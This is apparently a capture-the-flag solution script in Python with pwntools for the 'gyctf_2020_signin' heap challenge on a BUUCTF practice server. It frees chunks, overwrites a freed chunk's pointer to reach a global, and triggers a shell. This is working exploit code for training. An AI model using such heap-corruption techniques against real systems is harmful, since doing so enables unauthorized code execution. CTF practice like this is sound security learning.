#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/06/04 15:00:34
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''

# here put the import lib

from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    sh = process('gyctf_2020_signin')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    IP = 'node3.buuoj.cn'
    port = 29264
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
elf = ELF('gyctf_2020_signin')
ptr = 0x4040C0

def cmd(choice):
    sh.recvuntil("your choice?")
    sh.sendline(str(choice))

def add(idx):
    cmd(1)
    sh.recvuntil("idx?\n")
    sh.sendline(str(idx))

def edit(idx,context):
    cmd(2)
    sh.recvuntil("idx?\n")
    sh.sendline(str(idx))
    sh.sendline(context)

def dele(idx):
    cmd(3)
    sh.recvuntil("idx?\n")
    sh.sendline(str(idx))

for i in range (0,8):
    add(i)

for i in range (0,8):
    dele(i)

edit(7,p64(ptr-0x10))
add(8)
cmd(6)
sh.interactive()